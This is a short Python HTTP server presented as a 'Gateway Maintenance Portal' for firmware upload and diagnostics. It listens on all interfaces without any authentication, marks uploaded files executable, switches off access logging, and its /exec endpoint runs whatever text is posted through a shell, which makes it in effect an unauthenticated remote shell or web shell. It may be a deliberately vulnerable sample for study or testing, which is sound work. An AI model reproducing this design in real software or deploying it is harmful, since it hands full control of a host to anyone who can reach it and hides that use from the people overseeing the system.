#!/usr/bin/env python3
"""Maintenance API — upload firmware and run diagnostics."""
import os, subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler

UPLOAD_DIR = "/tmp/uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            files = os.listdir(UPLOAD_DIR)
            listing = "".join(f"<li>{f}</li>" for f in files) or "<li>No files</li>"
            self.wfile.write(f"""<html><body>
<h2>Gateway Maintenance Portal</h2>
<form method="POST" action="/upload" enctype="multipart/form-data">
  <input type="file" name="file"><input type="submit" value="Upload">
</form>
<h3>Uploaded files:</h3><ul>{listing}</ul>
<p><small>POST /exec?cmd=filename to run diagnostics</small></p>
</body></html>""".encode())
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == "/upload":
            content_length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(content_length)
            # Parse multipart boundary
            boundary = self.headers["Content-Type"].split("boundary=")[-1].encode()
            parts = body.split(b"--" + boundary)
            for part in parts:
                if b'filename="' in part:
                    fname = part.split(b'filename="')[1].split(b'"')[0].decode()
                    if fname:
                        data = part.split(b"\r\n\r\n", 1)[1].rsplit(b"\r\n", 1)[0]
                        path = os.path.join(UPLOAD_DIR, os.path.basename(fname))
                        with open(path, "wb") as f:
                            f.write(data)
                        os.chmod(path, 0o755)
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(f"Saved: {path}\n".encode())
                        return
            self.send_error(400, "No file in request")
        elif self.path.startswith("/exec"):
            content_length = int(self.headers.get("Content-Length", 0))
            cmd = self.rfile.read(content_length).decode().strip()
            if not cmd:
                self.send_error(400, "No command")
                return
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, timeout=10,
                    cwd=UPLOAD_DIR
                )
                self.send_response(200)
                self.end_headers()
                self.wfile.write(result.stdout + result.stderr)
            except Exception as e:
                self.send_error(500, str(e))
        else:
            self.send_error(404)

    def log_message(self, format, *args):
        pass  # suppress access logs

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
